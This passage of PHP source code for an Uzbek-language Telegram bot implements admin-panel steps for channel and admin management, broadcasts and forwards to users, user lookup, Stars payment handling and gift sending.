        if ($admin_step == 'remove_channel') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal o'chirish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "Kanal raqamini yuboring (1, 2, 3, ...)",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $index = (int)$text;
            $channels = getChannels();
            
            if ($index < 1 || $index > count($channels)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri raqam!</b>\n\n"
                            . "1 dan " . count($channels) . " gacha raqam kiriting.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni o'chirish
            if (removeChannel($index)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                $channel = $channels[$index - 1];
                $channel_name = ($channel['type'] == 'public') ? 
                    "@" . $channel['username'] : 
                    "Maxfiy kanal (ID: " . $channel['chat_id'] . ")";
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Kanal muvaffaqiyatli o'chirildi!</b>\n\n"
                            . "🗑️ O'chirilgan kanal: $channel_name",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Kanal o'chirishda xatolik!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ========== ADMIN QO'SHISH/O'CHIRISH ==========
        
        // ADMIN QO'SHISH
        if ($admin_step == 'add_admin') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "Yangi admin ID raqamini yuboring.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $new_admin_id = $text;
            
            // Adminni qo'shish
            if (addAdmin($new_admin_id)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Yangi admin muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "👤 Admin ID: <code>$new_admin_id</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                
                // Yangi adminga xabar
                bot('sendMessage', [
                    'chat_id' => $new_admin_id,
                    'text' => "🎉 <b>Siz botda admin huquqlariga ega bo'ldingiz!</b>\n\n"
                            . "Endi siz admin panelidan foydalanishingiz mumkin.\n"
                            . "Bot: @Shpion_bot",
                    'parse_mode' => 'HTML'
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu admin allaqachon qo'shilgan!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ADMIN O'CHIRISH
        if ($admin_step == 'remove_admin') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin o'chirish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "O'chirilishi kerak bo'lgan admin ID raqamini yuboring.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $admin_to_remove = $text;
            
            // Asosiy adminni o'chirish mumkin emas
            if ($admin_to_remove == $admin_id) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Asosiy adminni o'chirish mumkin emas!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Adminni o'chirish
            if (removeAdmin($admin_to_remove)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Admin muvaffaqiyatli o'chirildi!</b>\n\n"
                            . "👤 O'chirilgan admin ID: <code>$admin_to_remove</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Admin o'chirishda xatolik!</b>\n\n"
                            . "Bu admin mavjud emas yoki asosiy admin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ========== XABAR YUBORISH QADAMLARI ==========
        
        // BARCHAGA XABAR
        if ($admin_step == 'broadcast_all') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $all_file = "all_users.txt";
            $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
            $total = count($users);
            $success = 0;
            $failed = 0;
            
            // Xabar yuborish boshlandi deb xabar
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🔄 <b>Xabar yuborish boshlandi...</b>\n\nJami: $total ta foydalanuvchi\n⏳ Iltimos kuting...",
                'parse_mode' => 'HTML'
            ]);
            
            foreach ($users as $user_id) {
                if ($user_id == $uid) {
                    $success++;
                    continue;
                }
                
                $result = bot('sendMessage', [
                    'chat_id' => $user_id,
                    'text' => $text,
                    'parse_mode' => 'HTML'
                ]);
                
                if (isset($result->ok) && $result->ok) {
                    $success++;
                } else {
                    $failed++;
                }
                
                usleep(100000);
            }
            
            setUserStep($uid, '');
            
            // Log yozish
            logMessageSend($uid, 'broadcast_all', 'all', $text);
            
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Xabar yuborish yakunlandi!</b>\n\n"
                        . "📊 Natijalar:\n"
                        . "• Jami: $total ta\n"
                        . "✅ Muvaffaqiyatli: $success ta\n"
                        . "❌ Muvaffaqiyatsiz: $failed ta",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // BIR KISHIGA XABAR USER ID
        if ($admin_step == 'single_message_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                setUserStep($uid, 'single_message_text', $text);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>User ID qabul qilindi:</b> <code>$text</code>\n\n"
                            . "📝 <b>Yubormoqchi bo'lgan xabaringizni yozing:</b>\n\n"
                            . "⚠️ HTML formatida yuborishingiz mumkin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\nFaqat raqam kiriting:",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA XABAR TEXT
        if ($admin_step == 'single_message_text') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $target_user_id = getUserTemp($uid);
            
            $result = bot('sendMessage', [
                'chat_id' => $target_user_id,
                'text' => $text,
                'parse_mode' => 'HTML'
            ]);
            
            if (isset($result->ok) && $result->ok) {
                // Log yozish
                logMessageSend($uid, 'single_message', $target_user_id, $text);
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Xabar muvaffaqiyatli yuborildi!</b>\n\n"
                            . "👤 Kimga: <code>$target_user_id</code>\n"
                            . "📝 Xabar: " . substr($text, 0, 50) . "...",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Xabar yuborishda xatolik!</b>\n\n"
                            . "Sabab: " . ($result->description ?? 'Noma\'lum xatolik'),
                    'parse_mode' => 'HTML'
                ]);
            }
            
            setUserStep($uid, '');
            exit();
        }
        
        // ========== FORWARD XABAR QADAMLARI ==========
        
        // BARCHAGA FORWARD
        if ($admin_step == 'forward_all') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // Bu qismda forward xabar kelishi kerak
            // Message forward qilinganmi tekshirish
            if (isset($message['forward_from']) || isset($message['forward_from_chat'])) {
                $forward_message_id = $message['message_id'];
                
                $all_file = "all_users.txt";
                $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                $total = count($users);
                $success = 0;
                $failed = 0;
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "🔄 <b>Forward xabar yuborish boshlandi...</b>\n\nJami: $total ta foydalanuvchi\n⏳ Iltimos kuting...",
                    'parse_mode' => 'HTML'
                ]);
                
                foreach ($users as $user_id) {
                    if ($user_id == $uid) {
                        $success++;
                        continue;
                    }
                    
                    try {
                        $result = bot('forwardMessage', [
                            'chat_id' => $user_id,
                            'from_chat_id' => $cid,
                            'message_id' => $forward_message_id
                        ]);
                        
                        if (isset($result->ok) && $result->ok) {
                            $success++;
                        } else {
                            $failed++;
                        }
                    } catch (Exception $e) {
                        $failed++;
                    }
                    
                    usleep(100000);
                }
                
                setUserStep($uid, '');
                
                // Log yozish
                logMessageSend($uid, 'forward_all', 'all', 'Forward xabar');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Forward xabar yakunlandi!</b>\n\n"
                            . "📊 Natijalar:\n"
                            . "• Jami: $total ta\n"
                            . "✅ Muvaffaqiyatli: $success ta\n"
                            . "❌ Muvaffaqiyatsiz: $failed ta",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Forward qilingan xabar yuboring!</b>\n\n"
                            . "Iltimos, forward qilmoqchi bo'lgan xabaringizni forward qilib yuboring.",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA FORWARD USER ID
        if ($admin_step == 'forward_single_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                setUserStep($uid, 'forward_single_message', $text);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>User ID qabul qilindi:</b> <code>$text</code>\n\n"
                            . "📤 <b>Forward qilmoqchi bo'lgan xabaringizni yuboring:</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\nFaqat raqam kiriting:",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA FORWARD MESSAGE
        if ($admin_step == 'forward_single_message') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $target_user_id = getUserTemp($uid);
            
            // Message forward qilinganmi tekshirish
            if (isset($message['forward_from']) || isset($message['forward_from_chat'])) {
                $forward_message_id = $message['message_id'];
                
                try {
                    $result = bot('forwardMessage', [
                        'chat_id' => $target_user_id,
                        'from_chat_id' => $cid,
                        'message_id' => $forward_message_id
                    ]);
                    
                    if (isset($result->ok) && $result->ok) {
                        // Log yozish
                        logMessageSend($uid, 'forward_single', $target_user_id, 'Forward xabar');
                        
                        $panel = json_encode([
                            'resize_keyboard' => true,
                            'keyboard' => [
                                [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                                [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                                [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                            ]
                        ]);
                        
                        bot('sendMessage', [
                            'chat_id' => $cid,
                            'text' => "✅ <b>Forward xabar muvaffaqiyatli yuborildi!</b>\n\n"
                                    . "👤 Kimga: <code>$target_user_id</code>",
                            'parse_mode' => 'HTML',
                            'reply_markup' => $panel
                        ]);
                    } else {
                        bot('sendMessage', [
                            'chat_id' => $cid,
                            'text' => "❌ <b>Forward xabar yuborishda xatolik!</b>",
                            'parse_mode' => 'HTML'
                        ]);
                    }
                } catch (Exception $e) {
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => "❌ <b>Forward xabar yuborishda xatolik!</b>\n\n"
                                . "Xatolik: " . $e->getMessage(),
                        'parse_mode' => 'HTML'
                    ]);
                }
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Forward qilingan xabar yuboring!</b>",
                    'parse_mode' => 'HTML'
                ]);
            }
            
            setUserStep($uid, '');
            exit();
        }
        
        // ========== QOIDA TAXRIRLASH ==========
        if ($admin_step == 'edit_rules') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            file_put_contents("rules.txt", $text);
            setUserStep($uid, '');
            
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Qoidalar muvaffaqiyatli yangilandi!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // ========== FOYDALANUVCHI QIDIRISH ==========
        if ($admin_step == 'search_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if ($text == '/all') {
                $all_file = "all_users.txt";
                $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                $total = count($users);
                
                $message = "👥 <b>Barcha foydalanuvchilar:</b>\n\n";
                $count = 0;
                foreach ($users as $user_id) {
                    $count++;
                    $message .= "$count. <code>$user_id</code>\n";
                    if ($count >= 50) {
                        $message .= "\n... va yana " . ($total - 50) . " ta";
                        break;
                    }
                }
                
                $message .= "\n\nJami: $total ta foydalanuvchi";
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                $user_data = getUserData($text);
                if ($user_data) {
                    $balance = $user_data['balance'] ?? 0;
                    $stars_balance = $user_data['stars_balance'] ?? 0;
                    $phone = $user_data['phone'] ?? 'Kiritilmagan';
                    $first_seen = date('d.m.Y H:i', strtotime($user_data['first_seen'] ?? 'now'));
                    $last_seen = date('d.m.Y H:i', strtotime($user_data['last_seen'] ?? 'now'));
                    $username = $user_data['username'] ?? 'yo\'q';
                    $name = $user_data['name'] ?? 'Noma\'lum';
                    
                    $info = "👤 <b>Foydalanuvchi ma'lumotlari</b>\n\n"
                          . "🆔 ID: <code>$text</code>\n"
                          . "👤 Ism: $name\n"
                          . "📱 Telefon: +$phone\n"
                          . "🔗 Username: @$username\n"
                          . "💰 Balans: $balance so'm\n"
                          . "⭐️ Stars balansi: $stars_balance ⭐️\n"
                          . "📅 Birinchi marta: $first_seen\n"
                          . "🕒 So'nggi faollik: $last_seen";
                    
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => $info,
                        'parse_mode' => 'HTML',
                        'reply_markup' => json_encode([
                            'inline_keyboard' => [
                                [['text' => "🎁 Gift yuborish", 'callback_data' => "gift_to_user|$text"]]
                            ]
                        ])
                    ]);
                } else {
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => "❌ <b>Foydalanuvchi topilmadi!</b>",
                        'parse_mode' => 'HTML'
                    ]);
                }
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
    }
    
    // ========== DEFAULT REPLY ==========
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "Iltimos menyudan tanlang yoki /start yozing.",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}

// ========== PRE-CHECKOUT QUERY HANDLER ==========
if ($pre_checkout_query) {
    $pre_checkout_query_id = $pre_checkout_query['id'];
    
    bot('answerPreCheckoutQuery', [
        'pre_checkout_query_id' => $pre_checkout_query_id,
        'ok' => true,
    ]);
    exit();
}

// ========== SUCCESSFUL PAYMENT HANDLER ==========
if (isset($message['successful_payment'])) {
    $successful_payment = $message['successful_payment'];
    $invoice_payload = $successful_payment['invoice_payload'];
    $ex = explode("-", $invoice_payload);
    
    if (count($ex) >= 2) {
        $amount = (int)$ex[1];
        $stars_amount = $amount * 180; // 1 ⭐️ = 180 so'm
        
        // Stars balansini yangilash
        updateStarsBalance($cid, $stars_amount);
        
        // To'lov logini yozish
        logPayment($cid, $stars_amount, $amount * 220, 'success');
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "<b>✅ To'lov muvaffaqiyatli amalga oshirildi!</b>\n\n"
                    . "⭐️ Qo'shilgan Stars: $stars_amount ⭐️\n"
                    . "💰 To'langan summa: " . ($amount * 220) . " so'm\n\n"
                    . "Rahmat! Endi sizning balansingizda $stars_amount ⭐️ mavjud.",
            'parse_mode' => "HTML",
            'reply_markup' => mainKeyboard(isAdmin($cid))
        ]);
        
        // Adminlarga xabar
        $admins = getAdmins();
        foreach ($admins as $admin_id) {
            bot('sendMessage', [
                'chat_id' => $admin_id,
                'text' => "💰 <b>Yangi to'lov!</b>\n\n"
                        . "👤 Foydalanuvchi: <code>$cid</code>\n"
                        . "⭐️ Stars: $stars_amount ⭐️\n"
                        . "💵 Summa: " . ($amount * 220) . " so'm\n"
                        . "🕒 Vaqt: " . date('d.m.Y H:i:s'),
                'parse_mode' => 'HTML'
            ]);
        }
    }
    exit();
}

// ========== CALLBACK QUERY HANDLER ==========
if ($callback_query) {
    $data = $callback_query['data'];
    $cid2 = $callback_query['message']['chat']['id'];
    $uid2 = $callback_query['from']['id'];
    $mid2 = $callback_query['message']['message_id'];
    $qid = $callback_query['id'];
    
    // Callback query ni javob berish
    bot('answerCallbackQuery', ['callback_query_id' => $qid]);
    
    // OBUNA TEKSHIRISH
    if ($data == 'checksuv') {
        $subscription = checkSubscription($uid2);
        if (!$subscription['status']) {
            bot('answerCallbackQuery', [
                'callback_query_id' => $qid,
                'text' => 'Hali barcha kanallarga obuna bo\'lmagansiz!',
                'show_alert' => true
            ]);
        } else {
            bot('deleteMessage', ['chat_id' => $cid2, 'message_id' => $mid2]);
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "✅ <b>Obunangiz tasdiqlandi!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid2))
            ]);
        }
        exit();
    }
    
    // BOT HOLATINI O'ZGARTIRISH
    if ($data == 'toggle_bot' && isAdmin($uid2)) {
        $current_status = getBotStatus();
        $new_status = $current_status == 'active' ? 'inactive' : 'active';
        $status_text = $new_status == 'active' ? '✅ Faol' : '⏸ To\'xtatilgan';
        $button_text = $new_status == 'active' ? '⏸ To\'xtatish' : '✅ Faollashtirish';
        
        setBotStatus($new_status);
        
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "🤖 <b>Bot holati o'zgartirildi!</b>\n\nYangi holat: $status_text",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[['text' => $button_text, 'callback_data' => 'toggle_bot', 'style' => "primary"]]]
            ])
        ]);
        exit();
    }
    
    // FOYDALANUVCHIGA XABAR YUBORISH
    if (strpos($data, 'msg_user|') === 0 && isAdmin($uid2)) {
        $user_id = explode('|', $data)[1];
        
        bot('sendMessage', [
            'chat_id' => $cid2,
            'text' => "📝 <b>Xabar yuborish</b>\n\n"
                    . "Foydalanuvchi: <code>$user_id</code>\n\n"
                    . "Yubormoqchi bo'lgan xabaringizni yozing:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        
        setUserStep($uid2, 'quick_message', $user_id);
        exit();
    }
    
    // FOYDALANUVCHIGA GIFT YUBORISH
    if (strpos($data, 'gift_to_user|') === 0 && isAdmin($uid2)) {
        $user_id = explode('|', $data)[1];
        
        bot('sendMessage', [
            'chat_id' => $cid2,
            'text' => "🎁 <b>Gift yuborish</b>\n\n"
                    . "Foydalanuvchi: <code>$user_id</code>\n\n"
                    . "Gift uchun kommentariya (tabrik so'zi) yozing:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        
        setUserStep($uid2, 'quick_gift_comment', $user_id);
        exit();
    }
    
    // QUICK GIFT COMMENT
    if (getUserStep($uid2) == 'quick_gift_comment' && isAdmin($uid2)) {
        $target_id = getUserTemp($uid2);
        $comment = $text;
        
        // Gift yuborish
        $res = bot('sendGift', [
            'user_id' => $target_id,
            'gift_id' => '5170233102089322756',
            'text' => $comment
        ]);

        if ($res && $res->ok) {
            logGiftSend($uid2, $target_id, '5170233102089322756', 15, $comment);
            
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "🎉 <b>Muvaffaqiyatli!</b>\n\nID: <code>$target_id</code> sovg'asi yuborildi.\nIzoh: <i>$comment</i>",
                'parse_mode' => 'HTML'
            ]);
        } else {
            $error_desc = $res->description ?? "Noma'lum xato";
            bot('sendMessage', [
                'chat_id' => $cid2,
                'text' => "❌ <b>Xatolik yuz berdi!</b>\n\nSababi: <code>$error_desc</code>",
                'parse_mode' => 'HTML'
            ]);
        }
        
        setUserStep($uid2, '');
        exit();
    }
    
    // ADMIN QO'SHISH
    if ($data == 'add_admin' && $uid2 == $admin_id) {
        bot('editMessageText', [
            'chat_id' => $cid2,
            'message_id' => $mid2,
            'text' => "➕ <b>Yangi admin qo'shish</b>\n\nYangi admin ID raqamini yuboring:",
            'parse_mode' => 'HTML'
        ]);
        setUserStep($uid2, 'add_admin');
        exit();
    }
    
    // ADMIN O'CHIRISH
    if ($data == 'remove_admin' && $uid2 == $admin_id) {
        bot('editMessageText', [
